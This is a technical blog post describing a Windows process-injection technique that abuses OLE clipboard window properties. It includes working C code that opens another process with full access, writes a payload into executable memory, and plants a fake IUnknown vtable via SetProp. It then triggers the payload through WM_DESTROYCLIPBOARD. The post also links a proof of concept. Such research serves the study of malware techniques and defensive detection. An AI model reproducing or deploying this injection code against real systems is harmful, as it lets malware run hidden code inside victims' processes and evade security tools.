

<h3>Introduction</h3>

<p>The Object Linking & Embedding (OLE) library (ole32.dll) works with private clipboard formats. It registers <code>CLIPBRDWNDCLASS</code> and assigns a number of window properties to store the address of interfaces required to process clipboard data. Hexacorn describes <a href="http://www.hexacorn.com/blog/2018/11/19/propagate-yet-another-follow-up-hypothetical-clipboard-execution-version/">here</a> how one of the properties can be leveraged for code injection. <code>ClipboardDataObjectInterface</code> can be used, but there's also <code>ClipboardRootDataObjectInterface</code> and <code>ClipboardDataObjectInterfaceMTA</code>. If the first two properties are set to the address of an <code>IUnknown</code> interface, the target process that registered the class will attempt to invoke the <code>Release</code> method upon the clipboard window receiving the <code>WM_DESTROYCLIPBOARD</code> message. </p>

<h3>Finding Windows</h3>

<p>Private clipboards registered by OLE32.dll can't be found by <code>EnumWindows</code> because they're message-only windows. <code>FindWindowEx</code> with <code>HWND_MESSAGE</code> will find them and is used for the PoC. Another approach requires reading the <code>ReservedForOle</code> value of each Thread Environment Block in a process. <code>ReservedForOle</code> points to a <a href="https://github.com/dotnet/coreclr/blob/master/src/vm/oletls.h">SOleTlsData</a> structure that contains a window handle for <code>CLIPBRDWNDCLASS</code>. To find private clipboards via the TEB, open a process and enumerate threads. Then perform the following steps:</p>

<ul>
<li>Open the thread</li>
<li>Query the ThreadBasicInformation</li>
<li>Read tbi.TebBaseAddress</li>
<li>Read sizeof(SOleTlsData) from teb.ReservedForOle</li>
<li>Read hwndClip</li>
</ul>

<h3>Interface</h3>

<p>Since only the <code>Release</code> method is called by the Window procedure that retrieves a pointer to the interface, the following structure is enough.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#696969; '>// fake interface</span>
<span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _IUnknown_t <span style='color:#800080; '>{</span>
    <span style='color:#696969; '>// a pointer to virtual function table</span>
    <span style='color:#603000; '>ULONG_PTR</span> lpVtbl<span style='color:#800080; '>;</span>
    <span style='color:#696969; '>// the virtual function table</span>
    <span style='color:#603000; '>ULONG_PTR</span> AddRef<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>ULONG_PTR</span> QueryInterface<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>ULONG_PTR</span> Release<span style='color:#800080; '>;</span>       <span style='color:#696969; '>// executed for WM_DESTROYCLIPBOARD</span>
<span style='color:#800080; '>}</span> IUnknown_t<span style='color:#800080; '>;</span>
</pre>

<h3>Injection</h3>

<p>The following code assumes a valid clipboard window already exists. There is no error checking.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#603000; '>VOID</span> clipboard<span style='color:#808030; '>(</span><span style='color:#603000; '>LPVOID</span> payload<span style='color:#808030; '>,</span> <span style='color:#603000; '>DWORD</span> payloadSize<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    <span style='color:#603000; '>HANDLE</span>     hp<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>HWND</span>       hw<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>DWORD</span>      id<span style='color:#800080; '>;</span>
    IUnknown_t iu<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>LPVOID</span>     cs<span style='color:#808030; '>,</span> ds<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>SIZE_T</span>     wr<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 1. Find a private clipboard.</span>
    <span style='color:#696969; '>//    Obtain the process id and open it</span>
    hw <span style='color:#808030; '>=</span> <span style='color:#400000; '>FindWindowEx</span><span style='color:#808030; '>(</span>HWND_MESSAGE<span style='color:#808030; '>,</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>,</span> <span style='color:#800000; '>L"</span><span style='color:#0000e6; '>CLIPBRDWNDCLASS</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#400000; '>GetWindowThreadProcessId</span><span style='color:#808030; '>(</span>hw<span style='color:#808030; '>,</span> <span style='color:#808030; '>&amp;</span>id<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    hp <span style='color:#808030; '>=</span> <span style='color:#400000; '>OpenProcess</span><span style='color:#808030; '>(</span><span style='color:#7d0045; '>PROCESS_ALL_ACCESS</span><span style='color:#808030; '>,</span> FALSE<span style='color:#808030; '>,</span> id<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>

    <span style='color:#696969; '>// 2. Allocate RWX memory in process and write payload</span>
    cs <span style='color:#808030; '>=</span> <span style='color:#400000; '>VirtualAllocEx</span><span style='color:#808030; '>(</span>hp<span style='color:#808030; '>,</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>,</span> payloadSize<span style='color:#808030; '>,</span>
        MEM_RESERVE <span style='color:#808030; '>|</span> MEM_COMMIT<span style='color:#808030; '>,</span> PAGE_EXECUTE_READWRITE<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#400000; '>WriteProcessMemory</span><span style='color:#808030; '>(</span>hp<span style='color:#808030; '>,</span> cs<span style='color:#808030; '>,</span> payload<span style='color:#808030; '>,</span> payloadSize<span style='color:#808030; '>,</span> <span style='color:#808030; '>&amp;</span>wr<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 3. Allocate RW memory in process.</span>
    <span style='color:#696969; '>//    Initialize and write IUnknown interface</span>
    ds <span style='color:#808030; '>=</span> <span style='color:#400000; '>VirtualAllocEx</span><span style='color:#808030; '>(</span>hp<span style='color:#808030; '>,</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>sizeof</span><span style='color:#808030; '>(</span>IUnknown_t<span style='color:#808030; '>)</span><span style='color:#808030; '>,</span>
        MEM_RESERVE <span style='color:#808030; '>|</span> MEM_COMMIT<span style='color:#808030; '>,</span> PAGE_READWRITE<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    iu<span style='color:#808030; '>.</span>lpVtbl  <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#603000; '>ULONG_PTR</span><span style='color:#808030; '>)</span>ds <span style='color:#808030; '>+</span> <span style='color:#800000; font-weight:bold; '>sizeof</span><span style='color:#808030; '>(</span><span style='color:#603000; '>ULONG_PTR</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    iu<span style='color:#808030; '>.</span>Release <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#603000; '>ULONG_PTR</span><span style='color:#808030; '>)</span>cs<span style='color:#800080; '>;</span>
    <span style='color:#400000; '>WriteProcessMemory</span><span style='color:#808030; '>(</span>hp<span style='color:#808030; '>,</span> ds<span style='color:#808030; '>,</span> <span style='color:#808030; '>&amp;</span>iu<span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>sizeof</span><span style='color:#808030; '>(</span>IUnknown_t<span style='color:#808030; '>)</span><span style='color:#808030; '>,</span> <span style='color:#808030; '>&amp;</span>wr<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 4. Set the interface property and trigger execution</span>
    <span style='color:#400000; '>SetProp</span><span style='color:#808030; '>(</span>hw<span style='color:#808030; '>,</span> <span style='color:#800000; '>L"</span><span style='color:#0000e6; '>ClipboardDataObjectInterface</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> ds<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#400000; '>PostMessage</span><span style='color:#808030; '>(</span>hw<span style='color:#808030; '>,</span> <span style='color:#7d0045; '>WM_DESTROYCLIPBOARD</span><span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 5. Release memory for code and data</span>
    <span style='color:#400000; '>VirtualFreeEx</span><span style='color:#808030; '>(</span>hp<span style='color:#808030; '>,</span> cs<span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span> MEM_DECOMMIT <span style='color:#808030; '>|</span> MEM_RELEASE<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#400000; '>VirtualFreeEx</span><span style='color:#808030; '>(</span>hp<span style='color:#808030; '>,</span> ds<span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span> MEM_DECOMMIT <span style='color:#808030; '>|</span> MEM_RELEASE<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#400000; '>CloseHandle</span><span style='color:#808030; '>(</span>hp<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h3>Summary</h3>

<p>This method is very similar to the <a href="https://modexp.wordpress.com/2018/08/23/process-injection-propagate/">PROPagate technique</a> because it uses the <code>SetProp</code> API. However, this is easier to exploit because the window procedure removes the window property after receiving <code>WM_DESTROYCLIPBOARD</code>. <a href="">PoC here.</a></p>

